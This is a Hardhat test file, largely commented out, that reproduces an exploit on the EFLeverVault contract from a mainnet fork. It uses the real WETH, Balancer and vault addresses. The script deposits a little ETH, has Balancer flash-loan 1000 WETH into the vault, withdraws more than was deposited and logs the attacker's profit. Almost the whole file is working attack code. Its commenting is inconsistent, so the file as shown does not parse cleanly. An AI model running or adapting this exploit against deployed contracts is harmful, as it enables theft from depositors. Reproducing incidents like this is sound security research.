// import { ethers } from 'hardhat'
// import { expect } from 'chai'
// import { IERC20, EFLeverVault, IBalancerVault } from '../typechain-types'

// describe('AttackContract Test', function () {
//     this.timeout(150000)
//     let vault: EFLeverVault
//     let WETH: IERC20
//     let balancerVault: IBalancerVault
//     let attacker: any

//     before(async function () {
//         ;[attacker] = await ethers.getSigners()
//         WETH = await ethers.getContractAt('IERC20', '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2')
//         balancerVault = await ethers.getContractAt('IBalancerVault', '0xBA12222222228d8Ba445958a75a0704d566BF2C8')
//         vault = await ethers.getContractAt('EFLeverVault', '0xe39fd820B58f83205Db1D9225f28105971c3D309')
//     })

//     it('should block number equal to 15746199', async function () {
//         const blockNumber = await ethers.provider.getBlockNumber()
//         expect(blockNumber).to.equal(15746199)
//     })
//     it('Should perform the attack', async function () {
//         // Record ETH balance before the attack
//         const ETHBalanceBefore = await ethers.provider.getBalance(attacker.address)
//         console.log('[Start] Attacker ETH balance before exploit:', ethers.formatEther(ETHBalanceBefore))

//         // Deposit ETH into the vault
//         let value = ethers.parseEther('0.1')
//         await vault.connect(attacker).deposit(value, { value: value })

//         // Prepare parameters for the flash loan
//         let tokens = [WETH.getAddress()]
//         let amounts = [ethers.parseEther('1000')]
//         let userData = ethers.hexlify(0x32) // If you're starting with a number

//         // Trigger flash loan
//         console.log(
//             '[Start] Before flashloan, ETH balance in EFLeverVault',
//             await ethers.provider.getBalance(vault.getAddress()),
//         )
//         await balancerVault.connect(attacker).flashLoan(vault.getAddress(), tokens, amounts, userData)
        // console.log(
        //     '[Start] After flashloan, ETH balance in EFLeverVault',
        //     await ethers.provider.getBalance(vault.getAddress()),
        // )

        // // Withdraw from the vault
        // await vault.connect(attacker).withdraw(ethers.parseEther('0.9'))

        // // Swap ETH for WETH
        // const ETHProfit = (await ethers.provider.getBalance(attacker.getAddress())) - ETHBalanceBefore
        // await WETH.connect(attacker).deposit({ value: ETHProfit })

        // // Record WETH balance after the attack
        // const WETHBalanceAfter = await WETH.balanceOf(attacker.getAddress())
        // console.log('[End] Attacker WETH balance after exploit:', ethers.formatEther(WETHBalanceAfter))
    })

    // // Receive function to accept ETH
    // it('should receive ETH', async function () {
    //     expect(await ethers.provider.getBalance(vault.getAddress())).to.be.gt(0)
    // })
})
